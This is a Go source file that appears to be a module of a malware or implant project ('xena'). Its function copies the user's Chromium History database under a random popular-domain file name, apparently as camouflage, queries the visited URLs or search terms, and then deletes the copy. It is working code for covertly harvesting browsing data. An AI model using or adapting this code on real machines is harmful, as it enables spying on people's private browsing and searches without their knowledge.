package modules

import (
	"database/sql"
	"errors"
	"io"
	"os"
	"xena/helpers"
)

// GrabChromiumHistory extracts Chromium's history and returns it as a slice of strings.
// It can either return visited urls or search terms. Accpeted input is: 'VISITS', 'TERMS'.
func GrabChromiumHistory(desiredInformation string) ([]string, error) {
	history := []string{}

	// User's home folder.
	homeDir, err := os.UserHomeDir()
	if os.IsNotExist(err) {
		return history, err
	}

	// Check default's location of Chromium.
	chromiumHistoryLocation := homeDir + "/.config/chromium/Default/History"
	_, err = os.Stat(chromiumHistoryLocation)
	if os.IsNotExist(err) {
		return history, err
	}

	// Read content of the database.
	dbFile, err := os.Open(chromiumHistoryLocation)
	if err != nil {
		return history, err
	}
	defer dbFile.Close()

	// Create a new temp folder, where we'll put the content of the db, since the original db file is protected.
	tempFileName := helpers.RandomPopularDomain()
	tempFilePath := homeDir + "/.config/chromium/Default/" + tempFileName
	tempFile, err := os.Create(tempFilePath)
	if err != nil {
		return history, err
	}

	_, err = io.Copy(tempFile, dbFile)
	if err != nil {
		return history, err
	}

	err = tempFile.Sync()
	if err != nil {
		return history, err
	}

	db, err := sql.Open("sqlite3", tempFilePath)
	if err != nil {
		return history, err
	}

	statement := ""
	switch desiredInformation {
	case "TERMS":
		statement = "SELECT DISTINCT term FROM keyword_search_terms"
	case "VISITS":
		statement = "SELECT DISTINCT url FROM urls"
	default:
		return history, errors.New("invalid input, please select a valid enum")
	}

	rows, err := db.Query(statement)
	if err != nil {
		return history, err
	}

	for rows.Next() {
		data := ""
		rows.Scan(&data)
		history = append(history, data)
	}

	// Remove the temp file.
	tempFile.Close()
	err = os.Remove(tempFilePath)
	if err != nil {
		return history, err
	}

	return history, nil
}
